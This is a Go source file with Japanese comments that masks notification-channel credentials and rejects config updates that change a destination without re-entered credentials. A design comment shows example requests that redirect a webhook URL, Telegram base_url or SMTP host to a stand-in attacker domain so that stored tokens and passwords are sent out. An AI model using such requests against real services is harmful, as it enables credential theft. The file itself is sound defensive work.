package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix はマスク値のマーカー接頭辞。API が認証情報を返す際は、この接頭辞のある値で実際の内容を置き換え、
// 更新 API でこの接頭辞のある値を受信したら「データベース内の元の値を保持」と解釈する。
//
// 空文字列や固定定数でなく接頭辞を使うのは、少しの識別情報も含めて
// （MaskedValue を参照）、キーを再度貼り付けなくてもユーザーが「どのボットか」を区別できるようにするため。
const MaskedPrefix = "__masked__"

// MaskedValue はマスク値を生成する：
//
//	"__masked__"              元の値が短すぎるため、ヒントは一切付けない
//	"__masked__:…ab12cd"      元の値の末尾 6 文字を識別用ヒントとして付ける
//
// 末尾 6 文字のみを公開するのは意図的：Webhook アドレスの識別情報は末尾部分（WeCom の key、
// Feishu のボット id など）にあり、接頭辞部分は各ボットで同じで識別に役立たない。末尾 6 文字では
// 認証情報を復元できないが、設定者が「自分のあのグループ」と識別するには十分。
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked は値がマスク値かどうか（API 応答後に変更されていないか）を返す。
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig は設定のコピーを返し、チャネルの認証情報フィールドをマスク値に置き換える。
//
// 不明なチャネルの種類では元の設定でなく空の map を返す。UI に「設定を利用できません」と表示するほうを選び、
// 種類を識別できないときに認証情報を含む可能性のある元の内容全体を返さない。
// 認証情報以外のフィールドはそのまま保持し、UI が正常に表示できるようにする。
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers のような入れ子構造は全体を1つの認証情報として扱う。子キーごとの判定では各チャネルが
		// 「どの子キーが認証情報か」という規則も宣言する必要があり、複雑さが効果を大きく上回る。
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials は「送信先アドレスが変わったが、呼び出し元が
// 認証情報フィールドを明示していない」を示す。黙って許可したり認証情報を破棄したりせず、これを返す理由は PrepareConfigUpdate を参照。
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 変更された送信先キー
	Missing []string // 明示されていない認証情報キー
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "送信先アドレス（" + strings.Join(e.Changed, "、") + "）が変更されました。認証情報のフィールド（" +
		strings.Join(e.Missing, "、") + "）も再入力してください。新しい値を入力するか、認証情報が不要なら明示的に空欄にしてください。" +
		"元の認証情報は以前のアドレス専用です。引き継ぐと新しいアドレスに送信されます。"
}

// PrepareConfigUpdate はチャネル設定をマージし、セキュリティ上慎重な扱いが必要な「送信先アドレス変更」に対応する。
//
// チャネル更新経路で単純な MergeConfig の代わりに使い、実測で実行可能だった次の経路を解決する：
// 送信先アドレス（メッセージを送る先）と認証情報（送信時の身元）は独立した2組のフィールドだが、MergeConfig
// は「言及のないキー」についてデータベース内の元の値をすべて保持する。そのため、チャネルを PATCH できる人なら誰でも、**アドレスだけを変更し、
// 認証情報を指定しない**ことで、サーバーにデータベース内の実際の認証情報を自分の管理するエンドポイントへ送信させられる：
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 元の Authorization ヘッダーがリクエストとともに外部送信される
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<実Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 後にユーザー名とパスワードを渡す
//
// この経路は完全に無通知で、リダイレクトに依存せず（ホストをまたぐ遷移の拒否では防げない）、
// 本パッケージのマスク機構の目的である「認証情報をブラウザーに返さない」を直接破る。
//
// 規則：いずれかの送信先キーを新しい値に変更したら、呼び出し元は**すべての**認証情報キーを明示する必要がある：
//   - 新しい値を指定 → 新しい値を使う
//   - 空文字列を明示的に渡す → このフィールドには認証情報が不要（クリアの意味を保持）
//   - マスク値をそのまま返す / キーを省略する → 拒否
//
// 3つ目も拒否するのは、「マスク値」の意味がまさに「以前の認証情報を継続使用」であり、その認証情報は
// 以前のアドレスに対してのみ有効だから。ここでは意図的に「認証情報の自動破棄」は行わない。任意の認証情報フィールド
// （webhook の headers、email の password）では、黙って「認証がなくなったのに API が 200 を返す」となり、
// エラーより調査しづらくなるため。操作者に再入力してもらうほうを選ぶ。
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("チャンネルの種類 %q は未登録です", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 文字列でない認証情報の値（webhook の headers オブジェクトなど）にマスクのリテラルが埋め込まれている場合は、
	// 呼び出し元が「元の値を保持」の番兵値を構造内部に入れたことを示す。MergeConfig は「文字列で、
	// かつ接頭辞付き」のみをマスクと解釈するため、この形は通常のオブジェクトとしてそのまま保存され、実際にデータベースへリテラルの
	// "__masked__" が入り、後の認証が黙って無効になり、エラーも一切出ない。拒否するほうを選ぶ。
	//
	// このチェックは必ず**最初**に置く：アドレス不変時は早期リターンするため、後ろに置くと
	// 「アドレス変更」の経路しかカバーしない（初版ではそう置き間違え、テストですぐ検出された）。
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 実際に変更された送信先キーを探す。マスク値は「未変更」に相当する。
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// アドレスが不変なら通常のマージを行う（マスク値は元の値を保持、空文字列はクリア、それ以外は上書き）。
		return MergeConfig(stored, incoming), nil
	}

	// アドレスが変わったら、すべての認証情報キーの明示を要求する。
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers は、マスクの番兵値を文字列以外の構造に埋め込んだ送信を拒否する。
//
// マスク機構の前提は「値全体が文字列」。webhook の headers のようなオブジェクトフィールドでは、
// 全体をマスクする（文字列 "__masked__" にする）か、全体を送信するしかなく、オブジェクト内部に番兵値を入れても
// 「不変」を表せず、実際の値としてデータベースに保存されてしまう。
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("フィールド %s にマスク文字 %q が含まれています。空欄で既存の値を使用するか、新しい値全体を指定してください。構造の内部にマスクを挿入できません",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue は2つの設定値の同値性を比較する。JSON シリアライズで比較するのは
// 型の違いにも対応するため。フロントエンドが送信するポートは number、データベースから読み戻すと float64 で、直接 == すると誤判定する。
//
// 「空」は正規化してから比較する必要がある。この設定モデルでは空文字列と「キーが存在しない」は同じ状態で、
// MergeConfig が空文字列を明示的なクリアとしてキーを直接 delete するため。正規化しないと、
// 常に空の任意の送信先フィールド（Telegram の base_url が唯一該当し、空なら
// 公式アドレスを使う）が、次の経路に進んでしまう：
//
//	新規作成時に base_url:"" を保存 → 初回保存で MergeConfig がキーを削除
//	→ 2回目の保存時に incoming は ""、stored はキーなしとなり、「アドレス変更」と判定
//	→ 認証情報はマスク値 → 400「送信先アドレスが変更されたため、認証情報フィールドも再入力してください」
//
// その後はユーザーが Bot Token を再度貼り付けない限り毎回保存に失敗するが、ユーザーは何も変えていない。
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue は設定値が「空」かどうかを判定する。
// 基準は MergeConfig のクリア判定（strings.TrimSpace(s) == ""）と一致する必要がある。
// そうしないと「MergeConfig は削除すべき、sameConfigValue は値ありと判断」という不整合が生じる。
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig は incoming を stored にマージし、チャネル設定の更新に使う。
//
// 規則：
//   - incoming で値がマスクのキー → stored の元の値を保持（ユーザーはこのフィールドを変更していない）
//   - incoming で値が空文字列のキー → 明示的なクリアとしてキーを削除
//   - それ以外のキー → incoming の値で上書き
//   - stored にあり incoming にないキー → 保持（部分更新の意味）
//
// 空文字列を「クリア」とするか明確にする必要がある。フロントエンドのフォームは未入力フィールドを空文字列として送信するため、
// 有効な値として書き込むと、「空欄なら元の値を保持」のフィールドを実際に消してしまう。
// ここでは明示的なクリアを選ぶ。誤設定のフィールドをクリアする際、ユーザーには他の表現方法がないため
// （フィールドの除去で「未指定」と「空値の指定」を区別できるが、UI はこの違いを使わない）。
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // マスク値 = 未変更、stored を保持
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
